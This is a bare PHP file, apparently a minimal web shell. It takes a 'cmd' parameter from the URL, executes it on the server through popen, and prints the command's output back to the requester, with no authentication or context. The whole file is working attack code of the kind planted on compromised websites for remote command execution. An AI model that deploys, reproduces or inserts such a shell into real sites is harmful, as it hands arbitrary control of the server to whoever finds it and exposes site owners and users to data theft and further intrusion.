	<?php
			if (isset($_GET['cmd'])) {
				$handle = popen($_GET['cmd'] . ' 2>&1', 'r');
				echo "<pre>" . fread($handle, 4096) . "</pre>";
				pclose($handle);
			}
			?>